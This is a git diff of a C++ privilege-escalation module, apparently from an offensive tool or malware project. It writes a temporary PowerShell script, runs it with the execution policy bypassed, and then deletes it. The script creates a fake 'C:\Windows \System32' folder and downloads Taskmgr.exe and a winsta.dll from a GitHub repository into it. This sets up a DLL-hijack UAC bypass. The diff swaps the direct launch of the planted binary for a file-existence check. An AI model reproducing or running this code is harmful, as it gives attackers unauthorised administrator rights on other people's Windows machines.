@@ -1,20 +1,27 @@
 #include "PrivilegeEscalation.h"
 
-
 // This function tries to privilege escalation
 const bool PrivilegeEscalation::run(void)
 {
-    std::string path = System::getTempPath() + "\\test.ps1";
+    // Create Powershell file and run
+    std::string tempPath = System::getTempPath() + "\\Temp.ps1";
     std::ofstream file;
-    file.open(path);
+    file.open(tempPath);
     file << "New-Item \"\\\\?\\C:\\Windows \\System32\" -ItemType Directory" << std::endl;
     file << "wget \"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/Taskmgr.exe\" -outfile \"C:\\Windows \\System32\\Taskmgr.exe\"" << std::endl;
     file << "wget \"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/winsta.dll\" -outfile \"C:\\Windows \\System32\\winsta.dll\"" << std::endl;
     file.close();
-    std::string command = "powershell -ExecutionPolicy Bypass -F " + path;
+    std::string command = "powershell -ExecutionPolicy Bypass -F " + tempPath; // Run the powershell file
     system(command.c_str());
-    remove(path.c_str());
-    system("\"C:\\Windows \\System32\\Taskmgr.exe\""); // POC
+    remove(tempPath.c_str());
+
+    // Checking Powershell results
+    if (System::fileExist("C:\\Windows \\System32\\Taskmgr.exe") && System::fileExist("C:\\Windows \\System32\\winsta.dll"))
+    {
+        // TODO: Create Process - "\"C:\\Windows \\System32\\Taskmgr.exe\"" :( SO HARD
+        return true;
+    }
+    
     return false;
 }
 
